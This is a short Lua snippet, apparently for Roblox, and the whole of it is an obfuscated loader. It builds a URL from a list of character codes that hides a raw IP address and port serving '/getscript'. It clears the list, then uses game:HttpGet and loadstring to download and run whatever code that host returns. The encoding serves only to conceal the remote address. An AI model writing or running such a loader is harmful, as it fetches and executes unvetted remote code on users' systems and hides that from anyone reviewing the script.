local _b = {104,116,116,112,58,47,47,55,56,46,49,53,52,46,49,48,51,46,52,50,58,57,50,57,54,47,103,101,116,115,99,114,105,112,116}
local _u = ""
for i = 1, #_b do
    _u = _u .. string.char(_b[i])
end
table.clear(_b)
_b = nil

loadstring(game:HttpGet(_u))()
